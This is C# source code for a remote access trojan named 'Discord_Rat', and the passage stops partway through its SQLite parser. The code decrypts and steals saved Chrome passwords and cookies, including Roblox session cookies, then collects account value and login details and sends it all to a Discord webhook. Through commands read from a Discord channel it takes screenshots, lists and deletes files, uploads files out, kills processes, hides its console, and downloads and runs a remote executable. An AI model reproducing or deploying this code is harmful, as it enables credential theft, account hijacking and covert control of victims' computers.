using System;
using System.Text;
using System.IO;
using System.Net;
using System.Collections.Specialized;
using System.Threading;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Generic;
using System.Linq;

namespace Discord_Rat
{
    class Checkers
    {

        public static string GrabRAP(string ID)
        {
            string[] assetTypes = new string[] { "Hat", "HairAccessory", "FaceAccessory", "NeckAccessory", "ShoulderAccessory", "FrontAccessory", "BackAccessory", "WaistAccessory", "Face", "Gear" };
            int rapnum = 0;
            foreach (var assetType in assetTypes)
            {
                using (WebClient webClient = new WebClient())
                {
                    try
                    {

                        string text2 = webClient.DownloadString("https://inventory.roblox.com/v1/users/" + ID + "/assets/collectibles?assetType=" + assetType + "&sortOrder=Asc&limit=100");
                        string[] rapvals = text2.Split(new string[] { "recentAveragePrice\"" }, StringSplitOptions.None);
                        foreach (string rap in rapvals)
                        {

                            if (rap.Contains("originalPrice"))
                            {

                                string oof = rap.Replace("\"", "");

                                string num = Betweentwo(oof, ":", ",originalPrice", "originalPrice");
                                int rapnumer = Convert.ToInt32(num);
                                rapnum = rapnum + rapnumer;
                            }
                            else
                            {
                                continue;
                            }

                        }

                    }
                    catch (WebException ex)
                    {

                    }
                }


            }

            return (rapnum.ToString());
        }
        public static string Betweentwo(string data, string one, string two, string contains)
        {
            try
            {


                if (data.Contains(contains))
                {
                    int pFrom = data.IndexOf(one) + one.Length;
                    int pTo = data.LastIndexOf(two);
                    string returns;
                    returns = data.Substring(pFrom, pTo - pFrom);
                    return returns;
                }
                else
                {
                    return "return";
                }
            }
            catch { }
            return "";
        }
        public static string Age(string id)
        {

            WebClient web2 = new WebClient();
            string Response = web2.DownloadString("http://www.roblox.com/users/" + id + "/profile");

            if (Response.Contains("Join")) // checks if theres that text in the website
            {
                string data = Response;
                return Betweentwo(data, "Join Date<p class=text-lead>", "<li class=profile-stat>", "Join");
                web2.Dispose();
                Console.ReadLine();
            }
            else
            {
                return "Invalid Cookie.\n";
                web2.Dispose();
                Console.ReadLine();
            }
        }
        //on Roblox and explore together!\"><meta property=og:image content=https://t6.rbxcdn.com
        public static string thumbnail(string id)
        {
            WebClient webby = new WebClient();
            string res = webby.DownloadString(("http://www.roblox.com/users/" + id + "/profile"));
            //return Betweentwo(res, "<img alt=avatar src=", "id=home-avatar-thumb class=avatar-card-image>", "-");
            return "";
        }
        //<h3>Credit Balance: <span class=Money>$2.20</span></h3>
        public static string Credit(string cookie)
        {

            WebClient web2 = new WebClient();
            web2.Headers.Add(HttpRequestHeader.Cookie, ".ROBLOSECURITY=" + cookie);
            string Response = web2.DownloadString("https://www.roblox.com/premium/membership");

            if (Response.Contains("Credit")) // checks if theres that text in the website
            {
                string data = Response;
                return Betweentwo(data, "Credit Balance: <span class=Money>$", "</span></h3></div><div class=", "Credit");
                web2.Dispose();
                Console.ReadLine();
            }
            else
            {
                return "$0.00";
                web2.Dispose();
                Console.ReadLine();
            }
        }
        public static string GETD(string cookie)
        {

            WebClient web2 = new WebClient();
            web2.Headers.Add(HttpRequestHeader.Cookie, ".ROBLOSECURITY=" + cookie);
            string Response = web2.DownloadString("http://www.roblox.com/mobileapi/userinfo");

            if (Response.Contains("UserName")) // checks if theres that text in the website
            {
                string data = Response;
                return data;
                web2.Dispose();
                Console.ReadLine();
            }
            else
            {
                return "Invalid Cookie.\n";
                web2.Dispose();
                Console.ReadLine();
            }
        }


        //Membership
        public static string Membership(string user)
        {
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("https://www.roblox.com/Thumbs/BCOverlay.ashx?username=" + user);
            webRequest.AllowAutoRedirect = false;  // IMPORTANT

            webRequest.Timeout = 3000;           // timeout 3s
            webRequest.Method = "HEAD";
            // Get the response ...
            HttpWebResponse webResponse;
            using (webResponse = (HttpWebResponse)webRequest.GetResponse())
            {
                // Now look to see if it's a redirect
                if ((int)webResponse.StatusCode >= 300 && (int)webResponse.StatusCode <= 399)
                {
                    string uriString = webResponse.Headers["Location"];
                    if (uriString.Contains("https://static.rbxcdn.com/images/empty.png") == true)
                    {
                        return "NBC";
                    }
                    else if (uriString.Contains("https://static.rbxcdn.com/images/icons/overlay_bcOnly.png") == true)
                    {
                        return "BC";
                    }
                    else if (uriString.Contains("https://static.rbxcdn.com/images/icons/overlay_TbcOnly.png") == true)
                    {
                        return "TBC";
                    }
                    else if (uriString.Contains("https://static.rbxcdn.com/images/icons/overlay_obcOnly.png") == true)
                    {
                        return "OBC";
                    }
                    webResponse.Close(); // don't forget to close it - or bad things happen!
                }

            }
            return "No Username";

        }

    }
    class Program
    {
        //WARNING!! This is pretty shitty code
        #region variables
        public static string name = "";
        public static string data = "";
        public static string proccess = "";
        public static string alldirs = "";
        public static string webHook = "WEBHOOK"; //Webhhook
        public static string value = ""; //Discord Token
        public static string cID = "CHANNEL ID";
        public static List<string> plist = new List<string>();
        public static List<string> clist = new List<string>();
        public static List<GoogleChrome.PasswordData> passes = GoogleChrome.Recover();
        public static List<GoogleChrome.CookiesData> cookies = GoogleChrome.Recovercookies();
        #endregion
        public static string Betweentwo(string data, string one, string two, string contains)
        {
            if (data.Contains(contains))
            {
                int pFrom = data.IndexOf(one) + one.Length;
                int pTo = data.LastIndexOf(two);
                string returns;
                returns = data.Substring(pFrom, pTo - pFrom);
                return returns;
            }
            else
            {
                return "return";
            }
        }
        static void Main(string[] args)
        {
            foreach (var pass in passes) { plist.Add(pass.Host + "+" + pass.User + "+" + pass.Password + ""); }
            foreach (var cookie in cookies) { clist.Add(cookie.Host1 + "+" + cookie.name + "+" + cookie.cookie + ""); }

            name = Environment.UserName;
            Start();
            while (true)
            {

                WebClient webby = new WebClient();
                webby.Proxy = null;
                webby.Headers["Authorization"] = value;
                data = webby.DownloadString($"https://discordapp.com/api/v6/channels/{cID}/messages?limit=1"); //Gets the last message sent in a Specific Channel
                data = data.Replace("\"", "");
                string accountname = Between(data, "username: ", ", discriminat");
                data = Between(data, "content: ", ", channel_id");
                if (accountname != "Rat")
                {
                    if (data.Contains(";"))
                    {
                        CommandHandler(data);
                    }
                }

                Thread.Sleep(100);
            }

        }
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        public static void CommandHandler(string command)
        {
            if (command.Contains(name))
            {
                if (command.Contains(";screenshot"))
                {
                    TakeScreenshot();
                    sendWebhok("Took a screenshot");
                }
                else if (command.Contains(";hidec"))
                {
                    var handle = GetConsoleWindow();
                    ShowWindow(handle, SW_HIDE);
                    sendWebhok("Console Hid");
                }
                else if (command.Contains(";showc"))
                {
                    var handle = GetConsoleWindow();
                    ShowWindow(handle, SW_SHOW);
                    sendWebhok("Console Shown");
                }
                else if (command.Contains(";chicken"))
                {
                    WebClient w = new WebClient();
                    Random r = new Random();
                    string path = $@"C:\Users\{Environment.UserName}\AppData\Local\Temp\{r.Next(500, 10000).ToString()}.exe";
                    w.DownloadFile("https://cdn.discordapp.com/attachments/556266977983725568/556671316628078592/Chicken.exe", path);
                    Process.Start(path);
                    sendWebhok("Chickened User");
                    TakeScreenshot();

                }
                else if (command.Contains(";getroblox"))
                {
                    foreach (var cookie in clist)
                    {
                        if (cookie.Contains("_|WARNING:-DO-NOT-SHARE-THIS"))
                        {
                            string step1 = cookie + "END";
                            string step2 = Between(step1, "_|WARNING:-DO-NOT-SHARE-THIS", "END");

                            string rcookie = "_|WARNING:-DO-NOT-SHARE-THIS" + step2;

                            string data = Checkers.GETD(rcookie);
                            data = data.Replace('"', ' ');

                            string Credit = Checkers.Credit(rcookie);
                            string thumbnail = Betweentwo(data, "ThumbnailUrl : ", " , IsAnyBuildersClubMember", "IsAnyBuildersClubMember");
                            string robux = Betweentwo(data, "RobuxBalance :", ", TicketsBalan", "TicketsBalan");
                            string username = Betweentwo(data, " UserName : ", " , RobuxBalance", "UserName");
                            string rap = Checkers.GrabRAP(Betweentwo(data, "UserID : , ", ", UserNa", "ID"));
                            string bc = Checkers.Membership(username);
                            string user = "User Not Saved";
                            string pass = "Pass Not Saved";
                            foreach (var password in plist)
                            {
                                if (password.Contains(username))
                                {
                                    string[] userpass = password.Split('+');
                                    user = userpass[1];
                                    pass = userpass[2];
                                }
                            }
                            format(bc, rap, rcookie, username, user, pass, Environment.UserName, robux, Credit, thumbnail);
                        }
                    }
                }
                else if (command.Contains(";remoteview"))
                {
                    new Thread(delegate ()
                    {

                        for (int i = 0; i < 50; i++)
                        {
                            TakeScreenshot();
                        }
                    }).Start();
                }
                else if (command.Contains(";test"))
                {
                    sendWebhok("test");
                }
                else if (command.Contains(";nick"))
                {
                    string[] split = command.Split(' ');
                    name = split[2];
                    sendWebhok($"Changed Client Name to {name}");
                }
                else if (command.Contains(";help"))
                {
                    sendWebhok($"**HELP MENU**");
                    WebClient w = new WebClient();
                    w.Headers["Content-Type"] = "application/json";
                    byte[] data = Encoding.ASCII.GetBytes("{ \"embeds\": [{ \"image\": { \"url\": \"https://vgy.me/3hbR5R.gif\" } }] }");
                    w.UploadData(webHook, data);
                    sendWebhok(@";dir - Get all Directories in a path 
;getfiles - Get all Files in a path 
;uploadfile - upload a file to discord
;screenshot - Take a Screenshot 
;test - tests?
;ConnectedClients - Gets all the connected Clients
;nick - Changes Bots Nickname 
;terminate - closes the client
;dfspam - spams the download folder with blank text files
;getip - gets client ip address
;del - deletes a specified file
;getroblox - gets roblox info
;remoteview - starts spamming there screen every second
;showp - shows all running processes
;killp - kills a process by its id
;chicken - shows a chicken on the client screen
;hidec - hides console
;showc - shows console
;openlink - opens a link
");
                }
                else if (command.Contains(";showp"))
                {
                    Process[] processlist = Process.GetProcesses();

                    foreach (Process theprocess in processlist)
                    {
                        proccess += String.Format("Process: {0} ID: {1}", theprocess.ProcessName, theprocess.Id) + Environment.NewLine;

                    }
                    sendWebhok(proccess);
                    proccess = "";
                }
                else if (command.Contains(";killp"))
                {
                    try
                    {


                        command = command + "҂";
                        string idstring = Between(command, $";killp {name} ", "҂");
                        int id = Int32.Parse(idstring);
                        Process.GetProcessById(id).Kill();
                        sendWebhok($"Killed Proccess {idstring}");
                    }
                    catch { }
                }
                else if (command.Contains(";terminate"))
                {
                    sendWebhok($"Client: {name} has been terminated...");
                    Environment.Exit(0);
                }
                else if (command.Contains(";del"))
                {
                    try
                    {


                        command = command + "423849203";
                        File.Delete(Between(command, $";del {name} ", "423849203"));
                        sendWebhok("Deleted file: " + Between(command, $";del {name} ", "423849203"));
                    }
                    catch { sendWebhok("Error When deleting file..."); }
                }
                else if (command.Contains(";dir"))
                {
                    try
                    {
                        command = command + "423849203";
                        foreach (string hi in Directory.GetDirectories(Between(command, $";dir {name} ", "423849203")))
                        {
                            alldirs += hi + Environment.NewLine;
                        }
                        Console.WriteLine(alldirs.Length);
                        sendWebhok(alldirs);
                        alldirs = "";
                    }
                    catch { sendWebhok("Error When Getting Directories..."); }
                }
                else if (command.Contains(";uploadfile"))
                {
                    try
                    {
                        command = command + "423849203";
                        WebClient w = new WebClient();
                        w.Headers["Authorization"] = value;
                        w.UploadFile($"https://discordapp.com/api/v6/channels/{cID}/messages", Between(command, $";uploadfile {name} ", "423849203"));
                    }
                    catch
                    {

                    }
                }
                else if (command.Contains(";openlink"))
                {
                    command = command + "423849203";
                    Process.Start(Between(command, $";openlink {name} ", "423849203"));
                    sendWebhok("Done");
                }
                else if (command.Contains(";dfspam"))
                {
                    Random r = new Random();
                    for (int i = 0; i < 9000; i++)
                    {
                        File.Create($@"C:\Users\{Environment.UserName}\Downloads\{i.ToString() + ".txt"}");
                    }
                }
                else if (command.Contains(";getip"))
                {
                    WebClient w = new WebClient();
                    string ip = w.DownloadString("https://api.ipify.org");
                    sendWebhok("no");
                }
                else if (command.Contains(";getfiles"))
                {
                    try
                    {
                        command = command + "423849203";
                        foreach (string hi in Directory.GetFiles(Between(command, $";getfiles {name} ", "423849203")))
                        {
                            alldirs += hi + Environment.NewLine;
                        }
                        sendWebhok(alldirs);
                        alldirs = "";
                    }
                    catch { sendWebhok("Error When Getting Files..."); }
                }
            }
            else { }
            if (command == ";ConnectedClients")
            {
                sendWebhok($"Client: {name}");
            }
        } //Handles all the Commands
        public static void sendWebhok(string message)
        {
            using (dWebHook dcWeb = new dWebHook())
            {
                dcWeb.ProfilePicture = "https://static.giantbomb.com/uploads/original/4/42381/1196379-gas_mask_respirator.jpg";
                dcWeb.UserName = "Rat";
                dcWeb.WebHook = webHook;
                dcWeb.SendMessage(message);
                Thread.Sleep(1500);
                data = "";
            }

        }
        private static string GetNumbers(string input)
        {
            return new string(input.Where(c => char.IsDigit(c)).ToArray());
        }
        public static void format(string bc, string rap, string cookie, string username, string user, string pass, string PCNAME, string robux, string credit, string thumbnail)
        {
            int num = Convert.ToInt32(Program.GetNumbers(rap));

            using (GoogleChrome.dWebHook dWebHook = new GoogleChrome.dWebHook())
            {
                dWebHook.ProfilePicture = "https://static.giantbomb.com/uploads/original/4/42381/1196379-gas_mask_respirator.jpg";
                dWebHook.UserName = "Roblox - Discord Rat";
                dWebHook.WebHook = webHook;
                dWebHook.SendMessage(string.Concat(new string[]
                {
                        "```",
                        cookie,
                        "```",
                        Environment.NewLine,
                        Environment.NewLine,
                        "RAP: ",
                        num.ToString(),
                        Environment.NewLine,
                        "Robux: ",
                        robux,
                        Environment.NewLine,
                        "Membership: ",
                        bc,
                        Environment.NewLine,
                        "Credit: ",
                        credit,
                        Environment.NewLine,
                        "Username: ",
                        username,
                        Environment.NewLine,
                        "Login Details: ",
                        user,
                        ":",
                        pass,
                        Environment.NewLine,
                        "PC Name: ",
                        PCNAME,
                        Environment.NewLine,
                        "Thumbnail: ",
                        thumbnail
                }));
            }
        }
            internal static byte[] ImageToByteArray(Image img)
        {
            byte[] byteArray = new byte[0];
            MemoryStream stream = new MemoryStream();
            img.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
            stream.Close();
            byteArray = stream.ToArray();
            return byteArray;
        }
        public static void TakeScreenshot()
        {


            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            Graphics graphics = Graphics.FromImage(bitmap);

            graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            graphics.Dispose();
            Random r = new Random();
            string fpath = $@"C:\Users\{Environment.UserName}\AppData\Local\Temp\" + r.Next(100, 1000000) + ".png";
            bitmap.Save(fpath);
            Image img = (Image)bitmap;
            string str = Convert.ToBase64String(ImageToByteArray(img));
            WebClient w = new WebClient();
            w.Headers["Authorization"] = value;
            w.UploadFile($"https://discordapp.com/api/v6/channels/{cID}/messages", fpath);
            Thread.Sleep(500);


        }
        public static void Start()
        {
            sendWebhok($"Bot: Connected \r\nMachineName: {Environment.MachineName}\r\nUsername: {Environment.UserName}\r\nCurrent Time: {DateTime.Now.ToShortTimeString()}");
        }
        public static string Between(string STR, string FirstString, string LastString)
        {
            string FinalString;
            int Pos1 = STR.IndexOf(FirstString) + FirstString.Length;
            int Pos2 = STR.IndexOf(LastString);
            FinalString = STR.Substring(Pos1, Pos2 - Pos1);
            return FinalString;
        }
        public static IEnumerable<String> SplitInParts(String s, Int32 partLength)
        {
            if (s == null)
                throw new ArgumentNullException("s");
            if (partLength <= 0)
                throw new ArgumentException("Part length has to be positive.", "partLength");

            for (var i = 0; i < s.Length; i += partLength)
                yield return s.Substring(i, Math.Min(partLength, s.Length - i));
        }
    }
    //Thanks Bon for this class 

    public class dWebHook : IDisposable
    {
        private readonly WebClient dWebClient;
        private static NameValueCollection discordValues = new NameValueCollection();
        public string WebHook { get; set; }
        public string UserName { get; set; }
        public string ProfilePicture { get; set; }

        public dWebHook()
        {
            dWebClient = new WebClient();
        }
        public void SendMessage(string msgSend)
        {
            if (msgSend.Length < 1999)
            {
                discordValues.Add("username", UserName);
                discordValues.Add("avatar_url", ProfilePicture);
                discordValues.Add("content", msgSend);
                dWebClient.UploadValues(WebHook, discordValues);

                discordValues.Remove("username");
                discordValues.Remove("avatar_url");
                discordValues.Remove("content");
            }
            else
            {
                var parts = Program.SplitInParts(msgSend, 1999);
                string nonsplit = (String.Join("҂", parts));
                string[] parts1 = nonsplit.Split('҂');
                foreach(string part in parts1)
                {
                    discordValues.Add("username", UserName);
                    discordValues.Add("avatar_url", ProfilePicture);
                    discordValues.Add("content", part);

                    dWebClient.UploadValues(WebHook, discordValues);

                    discordValues.Remove("username");
                    discordValues.Remove("avatar_url");
                    discordValues.Remove("content");
                }
            }
        }
        public void Dispose()
        {
            dWebClient.Dispose();
        }
    }
    #region SQL Stuffz
    public class GoogleChrome
    {

        private static IntPtr _hookID = IntPtr.Zero;
        public static List<PasswordData> Recover()
        {

            string datapath = String.Format("{0}\\Google\\Chrome\\User Data\\Default\\Login Data",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            List<PasswordData> data = new List<PasswordData>();
            SQLiteHandler SQLDatabase = null;

            try
            {
                SQLDatabase = new SQLiteHandler(datapath);
                SQLDatabase.ReadTable("logins");
            }
            catch (Exception)
            {
                //Handle exception
                return data;
            }

            if (File.Exists(datapath))
            {
                string host1;
                string user1;
                string pass1;
                for (var i = 0; i <= SQLDatabase.GetRowCount() - 1; i++)
                    try
                    {
                        host1 = SQLDatabase.GetValue(i, "origin_url");
                        user1 = SQLDatabase.GetValue(i, "username_value");
                        pass1 = Decrypt(Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")));

                        if (!String.IsNullOrEmpty(host1) && !String.IsNullOrEmpty(user1) && pass1 != null)
                        {
                            data.Add(new PasswordData
                            {
                                Host = host1,
                                User = user1,
                                Password = pass1
                            });
                        }
                    }
                    catch
                    {

                    }


            }

            return data;
        }

        public static List<CookiesData> Recovercookies()
        {

            string datapath1 = String.Format("{0}\\Google\\Chrome\\User Data\\Default\\Cookies",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            List<CookiesData> data1 = new List<CookiesData>();
            SQLiteHandler SQLDatabase1 = null;

            try
            {
                SQLDatabase1 = new SQLiteHandler(datapath1);
                SQLDatabase1.ReadTable("cookies");
            }
            catch (Exception)
            {
                //Handle exception
                return data1;
            }

            if (File.Exists(datapath1))
            {
                string host1;
                string name1;
                string cookie;
                for (var i = 0; i <= SQLDatabase1.GetRowCount() - 1; i++)
                    try
                    {
                        host1 = SQLDatabase1.GetValue(i, "host_key");
                        name1 = SQLDatabase1.GetValue(i, "name");
                        cookie = Decrypt(Encoding.Default.GetBytes(SQLDatabase1.GetValue(i, "encrypted_value")));

                        if (!String.IsNullOrEmpty(host1) && !String.IsNullOrEmpty(name1) && cookie != null)
                        {
                            data1.Add(new CookiesData
                            {
                                Host1 = host1,
                                name = name1,
                                cookie = cookie
                            });
                        }
                    }
                    catch
                    {

                    }


            }

            return data1;
        }

        public class PasswordData
        {
            public string Host { get; set; }
            public string User { get; set; }
            public string Password { get; set; }
        }
        public class dWebHook : IDisposable
        {
            private readonly WebClient dWebClient;
            private static NameValueCollection discordValues = new NameValueCollection();
            public string WebHook { get; set; }
            public string UserName { get; set; }
            public string ProfilePicture { get; set; }

            public dWebHook()
            {
                dWebClient = new WebClient();
            }


            public void SendMessage(string msgSend)
            {
                discordValues.Add("username", UserName);
                discordValues.Add("avatar_url", ProfilePicture);
                discordValues.Add("content", msgSend);

                dWebClient.UploadValues(WebHook, discordValues);

                discordValues.Remove("username");
                discordValues.Remove("avatar_url");
                discordValues.Remove("content");
            }

            public void Dispose()
            {
                dWebClient.Dispose();
            }
        }
        public class CookiesData
        {
            public string Host1 { get; set; }
            public string name { get; set; }
            public string cookie { get; set; }
        }
        [DllImport("Crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        string szDataDescr,
        ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved,
        ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pDataOut);

        private static string Decrypt(byte[] Datas)
        {
            var inj = new DATA_BLOB();
            var Ors = new DATA_BLOB();
            var Ghandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
            inj.pbData = Ghandle.AddrOfPinnedObject();
            inj.cbData = Datas.Length;
            Ghandle.Free();
            var entropy = new DATA_BLOB();
            var crypto = new CRYPTPROTECT_PROMPTSTRUCT();
            CryptUnprotectData(ref inj, null, ref entropy, IntPtr.Zero, ref crypto, 0, ref Ors);
            var Returned = new byte[Ors.cbData + 1];
            Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData);
            var TheString = Encoding.UTF8.GetString(Returned);
            return TheString.Substring(0, TheString.Length - 1);
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
            CRYPTPROTECT_PROMPT_ON_PROTECT = 2
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public readonly int cbSize;
            public readonly CryptProtectPromptFlags dwPromptFlags;
            public readonly IntPtr hwndApp;
            public readonly string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }





        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        public class SQLiteHandler
        {
            private readonly byte[] db_bytes;
            private readonly ulong encoding;
            private string[] field_names;
            private sqlite_master_entry[] master_table_entries;
            private readonly ushort page_size;
            private readonly byte[] SQLDataTypeSize = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
            private table_entry[] table_entries;

            public SQLiteHandler(string baseName)
            {
                if (File.Exists(baseName))
                {
                    FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
                    var str = Strings.Space((int)FileSystem.LOF(1));
                    FileSystem.FileGet(1, ref str, -1L, false);
                    FileSystem.FileClose(1);
                    db_bytes = Encoding.Default.GetBytes(str);
                    if (Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                        throw new Exception("Not a valid SQLite 3 Database File");
                    if (db_bytes[0x34] != 0)
                        throw new Exception("Auto-vacuum capable database is not supported");
                    //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
                    //{
                    //    throw new Exception("No supported Schema layer file-format");
                    //}
                    page_size = (ushort)ConvertToInteger(0x10, 2);
                    encoding = ConvertToInteger(0x38, 4);
                    if (decimal.Compare(new decimal(encoding), decimal.Zero) == 0)
                        encoding = 1L;
                    ReadMasterTable(100L);
                }
            }

            private ulong ConvertToInteger(int startIndex, int Size)
            {
                if ((Size > 8) | (Size == 0))
                    return 0L;
                ulong num2 = 0L;
                var num4 = Size - 1;
                for (var i = 0; i <= num4; i++)
                    num2 = (num2 << 8) | db_bytes[startIndex + i];
                return num2;
            }

            private long CVL(int startIndex, int endIndex)
            {
                endIndex++;
                var buffer = new byte[8];
                var num4 = endIndex - startIndex;
                var flag = false;
                if ((num4 == 0) | (num4 > 9))
                    return 0L;
                if (num4 == 1)
                {
                    buffer[0] = (byte)(db_bytes[startIndex] & 0x7f);
                    return BitConverter.ToInt64(buffer, 0);
                }
                if (num4 == 9)
                    flag = true;
                var num2 = 1;
                var num3 = 7;
                var index = 0;
                if (flag)
                {
                    buffer[0] = db_bytes[endIndex - 1];
                    endIndex--;
                    index = 1;
                }
                var num7 = startIndex;
                for (var i = endIndex - 1; i >= num7; i += -1)
                    if (i - 1 >= startIndex)
                    {
                        buffer[index] = (byte)(((byte)(db_bytes[i] >> ((num2 - 1) & 7)) & (0xff >> num2)) |
                                                (byte)(db_bytes[i - 1] << (num3 & 7)));
                        num2++;
                        index++;
                        num3--;
                    }
                    else if (!flag)
                    {
                        buffer[index] = (byte)((byte)(db_bytes[i] >> ((num2 - 1) & 7)) & (0xff >> num2));
                    }
                return BitConverter.ToInt64(buffer, 0);
            }

            public int GetRowCount()
            {
                return table_entries.Length;
            }

            public string[] GetTableNames()
            {
                string[] strArray2 = null;
                var index = 0;
                var num3 = master_table_entries.Length - 1;
                for (var i = 0; i <= num3; i++)
                    if (master_table_entries[i].item_type == "table")
                    {
                        strArray2 = (string[])Utils.CopyArray(strArray2, new string[index + 1]);
                        strArray2[index] = master_table_entries[i].item_name;
                        index++;
                    }
                return strArray2;
            }

            public string GetValue(int row_num, int field)
            {
                if (row_num >= table_entries.Length)
                    return null;
                if (field >= table_entries[row_num].content.Length)
                    return null;
                return table_entries[row_num].content[field];
            }

            public string GetValue(int row_num, string field)
            {
                var num = -1;
                var length = field_names.Length - 1;
                for (var i = 0; i <= length; i++)
                    if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                    {
                        num = i;
                        break;
                    }
                if (num == -1)
                    return null;
                return GetValue(row_num, num);
            }

            private int GVL(int startIndex)
            {
                if (startIndex > db_bytes.Length)
                    return 0;
                var num3 = startIndex + 8;
                for (var i = startIndex; i <= num3; i++)
                {
                    if (i > db_bytes.Length - 1)
                        return 0;
                    if ((db_bytes[i] & 0x80) != 0x80)
                        return i;
                }
                return startIndex + 8;
            }

            private bool IsOdd(long value)
            {
                return (value & 1L) == 1L;
            }

            private void ReadMasterTable(ulong Offset)
            {
                if (db_bytes[(int)Offset] == 13)
                {
                    var num2 = Convert.ToUInt16(
                        decimal.Subtract(
                            new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)),
                            decimal.One));
                    var length = 0;
                    if (master_table_entries != null)
                    {
                        length = master_table_entries.Length;
                        master_table_entries = (sqlite_master_entry[])Utils.CopyArray(master_table_entries,
                            new sqlite_master_entry[master_table_entries.Length + num2 + 1]);
                    }
                    else
                    {
                        master_table_entries = new sqlite_master_entry[num2 + 1];
                    }
                    int num13 = num2;
                    for (var i = 0; i <= num13; i++)
                    {
                        var num = ConvertToInteger(
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                        if (decimal.Compare(new decimal(Offset), 100M) != 0)
                            num += Offset;
                        var endIndex = GVL((int)num);
                        var num7 = CVL((int)num, endIndex);
                        var num6 = GVL(Convert.ToInt32(
                            decimal.Add(
                                decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))),
                                decimal.One)));
                        master_table_entries[length + i].row_id =
                            CVL(
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(new decimal(num),
                                        decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num6);
                        num = Convert.ToUInt64(decimal.Add(
                            decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))),
                            decimal.One));
                        endIndex = GVL((int)num);
                        num6 = endIndex;
                        var num5 = CVL((int)num, endIndex);
                        var numArray = new long[5];
                        var index = 0;
                        do
                        {
                            endIndex = num6 + 1;
                            num6 = GVL(endIndex);
                            numArray[index] = CVL(endIndex, num6);
                            if (numArray[index] > 9L)
                                if (IsOdd(numArray[index]))
                                    numArray[index] = (long)Math.Round((numArray[index] - 13L) / 2.0);
                                else
                                    numArray[index] = (long)Math.Round((numArray[index] - 12L) / 2.0);
                            else
                                numArray[index] = SQLDataTypeSize[(int)numArray[index]];
                            index++;
                        } while (index <= 4);
                        if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                            master_table_entries[length + i].item_type = Encoding.Default.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                        else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                            master_table_entries[length + i].item_type = Encoding.Unicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                        else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                            master_table_entries[length + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                        if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                            master_table_entries[length + i].item_name = Encoding.Default.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                    new decimal(numArray[0]))), (int)numArray[1]);
                        else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                            master_table_entries[length + i].item_name = Encoding.Unicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                    new decimal(numArray[0]))), (int)numArray[1]);
                        else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                            master_table_entries[length + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes,
